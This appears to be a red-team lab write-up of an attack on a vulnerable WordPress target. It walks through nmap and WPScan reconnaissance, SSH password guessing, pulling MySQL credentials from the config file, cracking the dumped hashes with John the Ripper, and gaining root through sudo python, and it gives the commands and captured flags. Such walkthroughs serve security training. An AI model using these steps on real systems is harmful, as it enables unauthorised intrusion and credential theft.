# Red Team: Summary of Operations
 
## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation
 
### Exposed Service
 
Nmap scan results for the target machine reveal the below services and OS details:
 
```bash
$ nmap -sV -O 192.168.1.0/24
```
<img src="https://github.com/pbottari/Cybersecurity-/blob/main/Pentesting/WordPress/Images/nmap1.jpg" width="1000"> 
<img src="https://github.com/pbottari/Cybersecurity-/blob/main/Pentesting/WordPress/Images/nmap2.jpg" width="1000"> 
<img src="https://github.com/pbottari/Cybersecurity-/blob/main/Pentesting/WordPress/Images/nmap3.jpg" width="1000"> 

On this exercise, only Target 1 is going to be attacked. The nmap scan identifies the services below as potential points of entry for Target 1:
  - Port 22/tcp – SSH – open 
    - Allows ssh logins and brute force attack using dictionary.
  - Port 80/tcp – HTTP – open
    - Allows for HTTP traffic and brute force attack using dictionary.
  - Port 111/tcp – rbcbind – open 
    - Allows to identify services that are running which help hackers in the reconnaissance step. RPC has several security vulnerabilities.
   - Port 139/tcp – netbios-ssn – open
     - Allows for network file sharing and potentially for reverse shell attack via Metasploit.     
   - Port 445/tcp – netbios-ssn – open
     - Allows for network file sharing and potentially for reverse shell attack via Metasploit. 
 
### Critical Vulnerabilities
The following vulnerabilities were identified on target 1:
 
#### WPScan
- WPScan was ran to enumerate version and users. 
- Wordpress is running version 3.7.8, which has many vulnerabilities: https://www.cvedetails.com/vulnerability-list/vendor_id-2337/product_id-4096/version_id-224460/Wordpress-Wordpress-3.7.8.html
- Two users were found: Michael and Steven.
<img src="https://github.com/pbottari/Cybersecurity-/blob/main/Pentesting/WordPress/Images/wpscan1.jpg" width="700"> 
<img src="https://github.com/pbottari/Cybersecurity-/blob/main/Pentesting/WordPress/Images/wpscan2.jpg" width="1000"> 

#### Brute Force Attack
 
- Michael password was guessed, and it was the same as his login, Michael. 
- Steven password was cracked using john the ripper after finding his has hash.
<img src="https://github.com/pbottari/Cybersecurity-/blob/main/Pentesting/WordPress/Images/mysql1.jpg" width="500"> 
<img src="https://github.com/pbottari/Cybersecurity-/blob/main/Pentesting/WordPress/Images/mysql2.jpg" width="1000"> 
<img src="https://github.com/pbottari/Cybersecurity-/blob/main/Pentesting/WordPress/Images/john.jpg" width="1000"> 
 
#### Python Shell Commands
- After logged in as Steven, I used the python bash commands to gain root access. 
<img src="https://github.com/pbottari/Cybersecurity-/blob/main/Pentesting/WordPress/Images/py1.jpg" width="900"> 
<img src="https://github.com/pbottari/Cybersecurity-/blob/main/Pentesting/WordPress/Images/py2.jpg" width="800"> 

## Exploitation
 
The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:

  - `flag1.txt`: {b9bbcb33e11b80be759}
     - **Exploit Used:**
         - Used ls to look at the html directory an inspected the files in it. Found the flag in the html directory.
     - **Commands Used:**
```bash
$ cd /var/www/html
$ ls
$ cat service.html
```
<img src="https://github.com/pbottari/Cybersecurity-/blob/main/Pentesting/WordPress/Images/flag1.jpg" width="1000"> 

- `flag2.txt`: {fc3fd58dcdad9ab23faca6e9a36e581c}
     - **Exploit Used:**
         - Weak password policy
         - Michael’s password was guessed while trying to login to his account using ssh.
         - The flag was found using the locate command. Flag was found in yhe /var/www directory.
     - **Commands used:**
```bash
$ ssh michael@192.168.1.110
>>> Password: Michael
$ locate flag
```                           
<img src="https://github.com/pbottari/Cybersecurity-/blob/main/Pentesting/WordPress/Images/flag2_2.jpg" width="700"> 
<img src="https://github.com/pbottari/Cybersecurity-/blob/main/Pentesting/WordPress/Images/flag2.jpg" width="400"> 

- `flag3.txt`: {afc01ab56b50591e7dccf93122770cd2}
    - **Exploit Used:**
        - Looking for information that sysadmin forgot to remove. 
        - Found the password for the MySQL database in the file wp_config.html located in the directory /var/www/html/wordpress: root and R@v3nSecurity.
        - Logged into the MySQL database and found the hashes for Michael’s and Steve’s password in the worpress database in the wp_users table.
        - Found flag 3 in the table wp_posts 
     - **Commands used:**
```bash
$ mysql -u root -p
>>> R@v3nSecurity
$ show database;
$ use wordpress;
$ show tables;
$ select * from wp_users;
$ select * from wp_posts where post_title=”flag3”;
``` 
<img src="https://github.com/pbottari/Cybersecurity-/blob/main/Pentesting/WordPress/Images/flag3_2.jpg" width="500"> 
<img src="https://github.com/pbottari/Cybersecurity-/blob/main/Pentesting/WordPress/Images/flag3_3.jpg" width="700"> 
<img src="https://github.com/pbottari/Cybersecurity-/blob/main/Pentesting/WordPress/Images/flag3_4.jpg" width="300"> 
<img src="https://github.com/pbottari/Cybersecurity-/blob/main/Pentesting/WordPress/Images/flag3_5.jpg" width="300"> 
<img src="https://github.com/pbottari/Cybersecurity-/blob/main/Pentesting/WordPress/Images/flag3_6.jpg" width="1000"> 
<img src="https://github.com/pbottari/Cybersecurity-/blob/main/Pentesting/WordPress/Images/flag3.jpg" width="1000"> 

- `flag4.txt`: {715dea6c055b9fe3337544932f2941ce}
   - **Exploit Used**
       - Python Shell command
       - Steven’s password was cracked using john the riper after creating a file called wp_hashes.txt with his hash in it.
       - Once logged in as Steven, I still could not gain root access, but found out with sudo -l that he could run commands on raven without password.
       - Python scrip was run to gain access and flag 4 was found.
    - **Command used:**
```bash
$ john wp_hashes.txt. The password is pink84.
$ sudo -l
$ sudo /usr/bin/python
>>> import os
>>> os.system ("sudo su root"|)
$ whoami
```
<img src="https://github.com/pbottari/Cybersecurity-/blob/main/Pentesting/WordPress/Images/flag4_2.jpg" width="800"> 
<img src="https://github.com/pbottari/Cybersecurity-/blob/main/Pentesting/WordPress/Images/flag4_3.jpg" width="800"> 
<img src="https://github.com/pbottari/Cybersecurity-/blob/main/Pentesting/WordPress/Images/flag4_4.jpg" width="700">
<img src="https://github.com/pbottari/Cybersecurity-/blob/main/Pentesting/WordPress/Images/flag4.jpg" width="600"> 





